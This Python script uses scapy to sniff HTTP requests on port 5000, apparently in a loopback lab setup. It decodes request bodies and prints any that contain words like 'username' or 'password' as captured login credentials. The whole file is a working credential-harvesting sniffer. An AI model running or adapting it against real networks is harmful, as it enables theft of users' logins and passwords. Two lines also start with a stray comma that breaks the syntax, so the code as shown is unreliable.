#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import urllib.parse 

scapy.bind_layers(scapy.TCP, http.HTTP, dport=5000)
scapy.bind_layers(scapy.TCP, http.HTTP, sport=5000)

def sniffer(interface):
    print(f"[*] Listening on {interface} for HTTP traffic on port 5000...")
    scapy.sniff(iface=interface, filter="port 5000", store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        
        host = packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path
        
,        if isinstance(host, bytes): host = host.decode(errors='ignore')
        if isinstance(path, bytes): path = path.decode(errors='ignore')
        
        url = host + path
        print(f"[+] HTTP Request Sniffed: {url}")

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            if isinstance(load, bytes): load = load.decode(errors='ignore')
            
,            load = urllib.parse.unquote_plus(load)
            
            keywords = ["username", "user", "login", "password", "pass"]
            
            for keyword in keywords:
                if keyword in load:
                    print("\n[+] Captured Login Credentials:")
                    print(load)
                    print("-" * 50)
                    break

# Listen on loopback
sniffer("lo")